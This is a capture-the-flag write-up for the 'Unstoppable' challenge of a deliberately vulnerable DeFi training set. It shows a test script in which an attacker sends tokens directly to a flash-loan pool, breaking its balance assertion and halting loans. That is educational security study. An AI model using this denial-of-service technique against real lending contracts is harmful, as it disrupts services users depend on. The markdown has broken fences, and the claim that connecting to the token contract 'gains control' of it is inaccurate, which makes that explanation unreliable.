# Challange #1 - Unstoppable

### There’s a tokenized vault with a million DVT tokens deposited. It’s offering <b>flash loans</b> for free, until the grace period ends.

### To pass the challenge, make the vault stop offering <b>flash loans</b>.

<b>_Flash Loans_</b> is located in the <b>UnstoppableLender.sol</b> file.

Challange is to disable the <b>flash loans</b> in the <b>UnstoppableLender.sol</b> file.

this function takes a uint256 borrowAmount as a parameter.

```solidity
function flashLoan(uint256 borrowAmount) external nonReentrant {}
```

now we need to inspect variable poolBalance in [UnstoppableLender.sol](/CTF%20-%20Damn%20Vulnerable/contracts/unstoppable/UnstoppableLender.sol) file.

```solidity]:

1. ```solidity
   uint256 public poolBalance;
   ```
2. ```solidity
   function depositTokens(uint256 amount) external nonReentrant {
        require(amount > 0, "Must deposit at least one token");
        // Transfer token from sender. Sender must have first approved them.
        damnValuableToken.transferFrom(msg.sender, address(this), amount);
        poolBalance = poolBalance + amount;
    }
   ```
3. ```solidity
   assert(poolBalance == balanceBefore);
   ```

## [Best place to exploit](/CTF%20-%20Damn%20Vulnerable/contracts/unstoppable/UnstoppableLender.sol)

```solidity

```solidity
assert(poolBalance == balanceBefore);
```

## [Exploit](/CTF%20-%20Damn%20Vulnerable/test/unstoppable/unstoppable.challenge.js)

```javascript
it("Exploit", async function () {
	const TokenContractExploit = this.token.connect(attacker);
	await TokenContractExploit.transfer(
		this.pool.address,
		INITIAL_ATTACKER_TOKEN_BALANCE
	);
});
```

## Explanation

```javascript
const TokenContractExploit = this.token.connect(attacker);
```

This line creates a new instance of the token contract (DamnValuableToken) connected to the attacker account.
It allows the attacker account to interact with the token contract, effectively gaining control over it.

```javascript
await TokenContractExploit.transfer(
	this.pool.address,
	INITIAL_ATTACKER_TOKEN_BALANCE
);
```

This line initiates a transfer of tokens from the attacker's controlled instance of the token contract to the lending contract (UnstoppableLender).
The transferred amount is INITIAL_ATTACKER_TOKEN_BALANCE, which is set to 100 tokens.
